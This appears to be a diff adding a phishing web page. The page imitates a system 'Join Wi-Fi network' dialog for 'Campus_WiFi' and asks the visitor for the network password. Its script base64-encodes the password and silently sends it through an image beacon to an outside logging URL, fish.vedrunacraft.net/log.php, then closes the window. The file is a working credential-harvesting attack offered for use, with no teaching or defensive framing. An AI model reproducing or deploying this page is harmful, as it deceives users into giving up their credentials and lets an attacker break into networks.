@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Join Wi-Fi network</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
+        }
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #202124; /* Cambia por tu imagen base64 si quieres */
+        }
+        .wifi-dialog {
+            width: 512px;
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 24px 48px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+        }
+        .dialog-header {
+            padding: 24px 24px 16px 24px;
+        }
+        .dialog-header h1 {
+            font-size: 20px;
+            font-weight: 400;
+            color: #202124;
+            letter-spacing: 0.25px;
+        }
+        .dialog-content {
+            padding: 0 24px 24px 24px;
+        }
+        .ssid-section {
+            margin-bottom: 24px;
+        }
+        .ssid-label {
+            font-size: 12px;
+            color: #5f6368;
+            margin-bottom: 4px;
+            letter-spacing: 0.3px;
+        }
+        .ssid-value {
+            font-size: 14px;
+            color: #202124;
+            padding: 8px 0;
+            border-bottom: 1px solid #dadce0;
+        }
+        .psk-info {
+            font-size: 12px;
+            color: #5f6368;
+            margin-bottom: 16px;
+            letter-spacing: 0.3px;
+        }
+        .form-group {
+            margin-bottom: 24px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 12px;
+            color: #5f6368;
+            margin-bottom: 4px;
+            letter-spacing: 0.3px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 8px 0;
+            border: none;
+            border-bottom: 1px solid #dadce0;
+            font-size: 14px;
+            color: #202124;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        .form-group input:focus {
+            border-bottom-color: #1a73e8;
+        }
+        .form-group input::placeholder {
+            color: #9aa0a6;
+        }
+        .checkbox-group {
+            margin-bottom: 32px;
+            display: flex;
+            align-items: center;
+        }
+        .checkbox-group input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+            cursor: pointer;
+            accent-color: #1a73e8;
+        }
+        .checkbox-group label {
+            font-size: 13px;
+            color: #3c4043;
+            cursor: pointer;
+        }
+        .dialog-actions {
+            display: flex;
+            justify-content: flex-end;
+            gap: 8px;
+            padding: 16px 24px 24px 24px;
+            border-top: 1px solid #f1f3f4;
+        }
+        .btn {
+            padding: 8px 16px;
+            font-size: 13px;
+            font-weight: 500;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            background: transparent;
+            color: #1a73e8;
+            letter-spacing: 0.25px;
+            min-width: 80px;
+        }
+        .btn:hover {
+            background: rgba(26, 115, 232, 0.04);
+        }
+        .btn-primary {
+            background: #1a73e8;
+            color: white;
+        }
+        .btn-primary:hover {
+            background: #1557b0;
+        }
+    </style>
+</head>
+<body>
+    <div class="wifi-dialog">
+        <div class="dialog-header">
+            <h1>Join Wi-Fi network</h1>
+        </div>
+        <div class="dialog-content">
+            <div class="ssid-section">
+                <div class="ssid-label">SSID</div>
+                <div class="ssid-value">Campus_WiFi</div>
+            </div>
+            <div class="psk-info">PSK (WPA or RSN)</div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Enter password" autocomplete="off">
+            </div>
+            <div class="checkbox-group">
+                <input type="checkbox" id="allow-others">
+                <label for="allow-others">Allow other users of this device to use this network</label>
+            </div>
+        </div>
+        <div class="dialog-actions">
+            <button class="btn" onclick="cancel()">Cancel</button>
+            <button class="btn btn-primary" onclick="connect()">Connect</button>
+        </div>
+    </div>
+
+    <script>
+        const LOGGING_URL = "https://fish.vedrunacraft.net/log.php";
+
+        function connect() {
+            const password = document.getElementById('password').value;
+            const allowOthers = document.getElementById('allow-others').checked;
+
+            const data = {
+                ssid: "Campus_WiFi",
+                password: password,
+                allow_others: allowOthers,
+                timestamp: new Date().toISOString()
+            };
+
+            // Convertir a base64 para enviar por GET
+            const dataBase64 = btoa(JSON.stringify(data));
+
+            // Enviar mediante un objeto Image (no afecta a la ventana)
+            const img = new Image();
+            img.src = LOGGING_URL + "?d=" + encodeURIComponent(dataBase64);
+
+            // Pequeño retardo para asegurar el envío y luego cerrar la ventana
+            setTimeout(() => {
+                window.close(); // Funciona porque la ventana fue abierta con window.open()
+            }, 100);
+        }
+
+        function cancel() {
+            document.getElementById('password').value = '';
+            document.getElementById('allow-others').checked = false;
+        }
+
+        // Permitir enviar con Enter
+        document.getElementById('password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                connect();
+            }
+        });
+    </script>
+</body>
+</html>
